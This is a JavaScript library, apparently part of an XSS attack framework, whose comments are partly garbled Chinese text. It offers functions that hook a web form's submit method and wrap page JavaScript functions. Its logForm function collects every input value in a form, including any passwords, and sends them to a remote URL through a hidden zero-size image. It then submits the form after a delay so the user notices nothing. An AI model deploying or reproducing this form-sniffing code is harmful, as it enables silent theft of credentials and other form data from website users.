//alert("hooklib.js");
/////////////////////////////////////////////////////
//// hookģ�� hook sumbmit; hook js function; 
//// hook link
/////////////////////////////////////////////////////
/*
* Name: hookSubmit
* Args:
*       o - specified form object
* e.g.
*       <form onkeydown="javascript: hookSubmit(this);" ..>
*
* If the form uses javascript to call submit method for submitting, you should install a hook on the form.
*/
function hookSubmit(o, injectFuncCallBack) {
	if (o.hooked == undefined) {
		o.hooked = true;
		o._submit = o.submit;

		o.submit = function() {
			//alert("submit hooked!");
			// hook�����Ĺ�����Ϊ�ڶ����������������
			injectFuncCallBack();					
			o.onsubmit();
		}
	}
}


/*
* Name: logForm
* Args:
*       o - specified form object
*       url - the url you want to get with form information
*       delay - time span you want to delay
* e.g.
*       <form onsubmit="return logForm(this, 'http://www.target.com', 500);" method="post" ...>
*/
function logForm(o, url, delay) {
	//alert("logForm");
	var inputs = o.getElementsByTagName("input");
	//url += "?";
	var param = ""; // form�Ĳ���

	for (var i = 0; i < inputs.length; i ++) {
		if (inputs[i].getAttribute("name") != null && 
			inputs[i].getAttribute("name") != "") {
			param += escape(inputs[i].getAttribute("name")) + "=" + escape(inputs[i].value) + "&";
		}
	}
	
	// ��¼�ύ�Ĳ�����Զ�̷�����
	param = XssGotFormSniffer_S + escape(param) + XssGotFormSniffer_E;
	//getURL(url+param);
	var img = document.createElement("IMG");
	document.body.appendChild(img);
	img.width = 0;
	img.height = 0;
	img.src = url+param;

  // ���ύ��ʱ,��֤logForm�ɹ�
	setTimeout(function(){
			if (o._submit != undefined) {
				o._submit();
			} else {
				o.submit();
			}
		}, delay);

	return false;
} 



//////////////////////////////////////////////////////////
// һ��JS������hook
// by axis
//////////////////////////////////////////////////////////
var hookJsFunction = function (){
	//alert("hookjsfunc");
  // ����ԭ����;������Ҫ��Ϊ����ָ��һ��,
  //������hook��ᶪʧ֮ǰ�����ԭ����
	//var RealFuncAfterHooked;  

  return {
	  hook: function(funcNameHooked, RealFuncAfterHooked, injectFunc){
	  	try {
	  	  setTimeout(function(){ 
	  		  //alert("hook before: "+window[funcNameHooked]);
	  		  // ����ԭ����
	  		  window[RealFuncAfterHooked] = window[funcNameHooked];
	  		  //window[funcNameHooked] = window[injectFunc];
	  		  // �����������Ը�����Ҫ���е���
	  		  window[funcNameHooked] = function (parm1,param2,param3,param4,param5,param6,param7){
	  			  window[injectFunc](parm1,param2,param3,param4,param5,param6,param7);   // ��ִ��ע��ĺ���
	  			  window[RealFuncAfterHooked](parm1,param2,param3,param4,param5,param6,param7);  // ��ִ��ԭ����
	  			  }
	  		  //alert("hook after: "+window[funcNameHooked]);
	  		  }, 
		      10);
		    return true;
		  } catch (e){
			  return false;
		  }
	  },
	  
	  unhook: function(funcNameHooked, RealFuncAfterHooked){
	  	try {
	  	  setTimeout(function(){ 
	  		  //alert("unhook before: "+window[funcNameHooked]);
	  		  window[funcNameHooked] = function (parm1,param2,param3,param4,param5,param6,param7){
	  			  window[RealFuncAfterHooked](parm1,param2,param3,param4,param5,param6,param7);  // ִ��ԭ����;
	  		  }
	  		  //alert("unhook after: "+window[funcNameHooked]);
	  		  }, 
		      10);
		    return true;
		  
		 } catch (e){
		 	  return false;
		 }
	  }
	};	
};

